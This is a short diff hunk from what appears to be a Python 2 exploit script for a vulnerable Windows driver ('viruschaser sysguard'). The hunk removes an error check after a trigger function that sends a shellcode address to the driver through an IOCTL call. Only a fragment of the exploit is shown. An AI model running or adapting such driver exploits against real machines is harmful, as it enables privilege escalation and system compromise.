@@ -209,9 +209,7 @@ def trigger(hDevice, dwIoControlCode, scAddr):
                            nOutBufferSize,      # _In_        DWORD
                            lpBytesReturned,     # _Out_opt_   LPDWORD
                            lpOverlapped)        # _Inout_opt_ LPOVERLAPPED
-    if not pwnd:
-        print "\t[-]Error: Not pwnd :(\n" + FormatError()
-        sys.exit(-1)
+    
 
 if __name__ == "__main__":
     print "\n**viruschaser sysguard Vulnerable Driver**"
